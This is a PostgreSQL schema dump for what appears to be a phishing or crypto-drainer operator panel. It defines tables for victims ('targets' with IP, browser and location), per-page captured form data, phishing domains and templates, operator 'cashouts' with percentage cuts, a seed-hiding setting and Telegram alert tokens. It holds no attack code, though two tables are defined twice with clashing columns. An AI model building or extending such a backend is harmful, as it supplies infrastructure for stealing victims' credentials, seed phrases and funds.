-- PostgreSQL database dump

DROP TABLE IF EXISTS public.users CASCADE;
DROP TABLE IF EXISTS public.guilddomains CASCADE;
DROP TABLE IF EXISTS public.cashouts CASCADE;
DROP TABLE IF EXISTS public.captured CASCADE;
DROP TABLE IF EXISTS public.targets CASCADE;
DROP TABLE IF EXISTS public.captureddata CASCADE;
DROP TABLE IF EXISTS public.guildsettings CASCADE;
DROP TABLE IF EXISTS public.admins CASCADE;
DROP TABLE IF EXISTS public.paused_guilds CASCADE;
DROP TABLE IF EXISTS public.bot_permissions CASCADE;

-- Create admins table
CREATE TABLE public.admins (
    userid uuid DEFAULT gen_random_uuid() NOT NULL,
    username text NOT NULL UNIQUE,
    password text NOT NULL,
    guild text DEFAULT 'default'::text,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP WITH TIME ZONE
);

-- Create paused guilds table
CREATE TABLE public.paused_guilds (
    guild TEXT PRIMARY KEY,
    paused_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- Create bot permissions table
CREATE TABLE public.bot_permissions (
    user_id TEXT PRIMARY KEY,
    permissions TEXT[] DEFAULT '{}'
);

--
-- Name: users; Type: TABLE; Schema: public
--

CREATE TABLE public.users (
    username text NOT NULL,
    userid text,
    password text, -- Should store a salted hash, not plain text
    rank text,
    starting_page text,
    guild text
);

--
-- Name: guilddomains; Type: TABLE; Schema: public
--

CREATE TABLE public.guilddomains (
    id integer NOT NULL,
    url text,
    template text,
    guild text
);

--
-- Name: guilddomains_id_seq; Type: SEQUENCE; Schema: public
--

CREATE SEQUENCE public.guilddomains_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;

--
-- Name: guilddomains_id_seq; Type: SEQUENCE OWNED BY; Schema: public
--

ALTER SEQUENCE public.guilddomains_id_seq OWNED BY public.guilddomains.id;


--
-- Name: cashouts; Type: TABLE; Schema: public
--

CREATE TABLE public.cashouts (
    id integer NOT NULL,
    username text,
    amount numeric,
    percentage_cut numeric,
    date_registered timestamp without time zone,
    status text,
    guild text
);

--
-- Name: cashouts_id_seq; Type: SEQUENCE; Schema: public
--

CREATE SEQUENCE public.cashouts_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;

--
-- Name: cashouts_id_seq; Type: SEQUENCE OWNED BY; Schema: public
--

ALTER SEQUENCE public.cashouts_id_seq OWNED BY public.cashouts.id;

--
-- Name: guilddomains id; Type: DEFAULT; Schema: public
--

ALTER TABLE ONLY public.guilddomains ALTER COLUMN id SET DEFAULT nextval('public.guilddomains_id_seq'::regclass);


--
-- Name: cashouts id; Type: DEFAULT; Schema: public
--

ALTER TABLE ONLY public.cashouts ALTER COLUMN id SET DEFAULT nextval('public.cashouts_id_seq'::regclass);

--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (username);


--
-- Name: guilddomains guilddomains_pkey; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.guilddomains
    ADD CONSTRAINT guilddomains_pkey PRIMARY KEY (id);


--
-- Name: cashouts cashouts_pkey; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.cashouts
    ADD CONSTRAINT cashouts_pkey PRIMARY KEY (id);

--
-- Name: targets; Type: TABLE; Schema: public
--

CREATE TABLE public.targets (
    id uuid NOT NULL,
    ip text,
    status text,
    currentpage text,
    browser text,
    location text,
    belongsto text
);

--
-- Name: targets targets_pkey; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.targets
    ADD CONSTRAINT targets_pkey PRIMARY KEY (id);


--
-- Name: captureddata; Type: TABLE; Schema: public
--

CREATE TABLE public.captureddata (
    id integer NOT NULL,
    targetid uuid,
    page text,
    captureddata jsonb
);

--
-- Name: captureddata_id_seq; Type: SEQUENCE; Schema: public
--

CREATE SEQUENCE public.captureddata_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;

--
-- Name: captureddata_id_seq; Type: SEQUENCE OWNED BY; Schema: public
--

ALTER SEQUENCE public.captureddata_id_seq OWNED BY public.captureddata.id;


--
-- Name: captureddata id; Type: DEFAULT; Schema: public
--

ALTER TABLE ONLY public.captureddata ALTER COLUMN id SET DEFAULT nextval('public.captureddata_id_seq'::regclass);


--
-- Name: captureddata captureddata_pkey; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.captureddata
    ADD CONSTRAINT captureddata_pkey PRIMARY KEY (id);


--
-- Name: guildsettings; Type: TABLE; Schema: public
--

CREATE TABLE public.guildsettings (
    guild text NOT NULL,
    hideseed boolean,
    telegram_bot_token text,
    telegram_chat_id text
);

--
-- Name: guildsettings guildsettings_pkey; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.guildsettings
    ADD CONSTRAINT guildsettings_pkey PRIMARY KEY (guild);


--
-- Name: admins admins_pkey; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.admins
    ADD CONSTRAINT admins_pkey PRIMARY KEY (userid);

--
-- Name: admins admins_username_key; Type: CONSTRAINT; Schema: public
--

ALTER TABLE ONLY public.admins
    ADD CONSTRAINT admins_username_key UNIQUE (username);

--
-- Name: paused_guilds; Type: TABLE; Schema: public
--

CREATE TABLE public.paused_guilds (
    guild text NOT NULL,
    paused_at timestamp without time zone DEFAULT now(),
    CONSTRAINT paused_guilds_pkey PRIMARY KEY (guild)
);

--
-- Name: bot_permissions; Type: TABLE; Schema: public
--

CREATE TABLE public.bot_permissions (
    user_id text NOT NULL,
    added_at timestamp without time zone DEFAULT now(),
    CONSTRAINT bot_permissions_pkey PRIMARY KEY (user_id)
);

--
-- Foreign Keys
--

ALTER TABLE ONLY public.targets
    ADD CONSTRAINT targets_belongsto_fkey FOREIGN KEY (belongsto) REFERENCES public.users(username) ON DELETE CASCADE;

ALTER TABLE ONLY public.cashouts
    ADD CONSTRAINT cashouts_username_fkey FOREIGN KEY (username) REFERENCES public.users(username) ON DELETE SET NULL;

ALTER TABLE ONLY public.captureddata
    ADD CONSTRAINT captureddata_targetid_fkey FOREIGN KEY (targetid) REFERENCES public.targets(id) ON DELETE CASCADE;

--
-- Indexes
--

CREATE INDEX targets_belongsto_idx ON public.targets USING btree (belongsto);
CREATE INDEX cashouts_username_idx ON public.cashouts USING btree (username);
CREATE INDEX captureddata_targetid_idx ON public.captureddata USING btree (targetid);


--
-- PostgreSQL database dump complete
--
